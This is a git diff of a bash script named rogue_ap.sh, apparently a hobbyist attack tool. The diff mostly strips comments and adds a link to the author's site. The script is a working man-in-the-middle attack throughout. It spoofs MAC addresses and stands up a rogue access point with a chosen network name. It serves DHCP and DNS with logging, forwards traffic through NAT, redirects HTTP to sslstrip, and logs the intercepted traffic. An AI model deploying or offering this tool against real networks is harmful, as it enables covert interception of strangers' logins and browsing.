@@ -4,6 +4,8 @@
 ## MADE BY N0NUSER (nonuser.es) ##
 ##################################
 
+# Explanation of code on https://nonuser.es
+
 verify_args(){
   if [ $# -ne 3 ];then
     echo -e "\n \e[1;4;33mUSAGE\e[0m: ./rogue_ap.sh \e[1;32m<ADAPTER 1> \e[1;34m<ADAPTER 2> \e[1;35m<ESSID>\n\e[0m\n"
@@ -53,7 +55,6 @@ verify_apps(){
 
 clear
 
-# CLEANING WHEN PROGRAM EXITTED
 trap '
 clear
 echo -e "\n \e[1;33mRebooting Network Services\e[5m...\e[0m\n"
@@ -71,29 +72,22 @@ if [ "$EUID" -ne 0 ]; then echo "Please run as root"; exit; fi
 verify_args $1 $2 $3
 verify_apps
 
-# CHANGES MAC ADDRESS OF ADAPTERS
 for i in $1 $2;do ifconfig $i down >/dev/null 2>&1; macchanger -r $i >/dev/null 2>&1; ifconfig $i up >/dev/null 2>&1; done
 
-# PREPARING ROGUE AP
 ifconfig $1 10.0.0.1/24 up
 echo -e "interface=$1\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp" > dnsmasq.conf
 dnsmasq -C dnsmasq.conf
 
-# FLUSHING FIREWALL TABLES
 iptables --flush
 echo 1 > /proc/sys/net/ipv4/ip_forward
 source /proc/sys/net/ipv4/ip_forward
 iptables -P FORWARD ACCEPT
-# THIS REDIRECTS THE CONNECTION TO THE SECOND ADAPTER
 iptables -t nat -A POSTROUTING -o $2 -j MASQUERADE
-# THIS REDIRECTS CONNECTIONS TO 10000 (SSLSTRIP)
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
-# ACTIVATING ROGUE AP
 echo -e "interface=$1\ndriver=nl80211\nssid=$3\nchannel=9" > hostapd.conf
 hostapd hostapd.conf &
 
-# SNIFFING
 DATE=$(date +%Hh-%Mm-%Ss_%d-%m-%Y)
 echo -e "Opening \e[1;5;33mSSLStrip\e[0m. You should also open \e[1;5;33mWireshark\e[0m\n\n"
 sslstrip -l 10000 -a -w log_rogue_$DATE.log
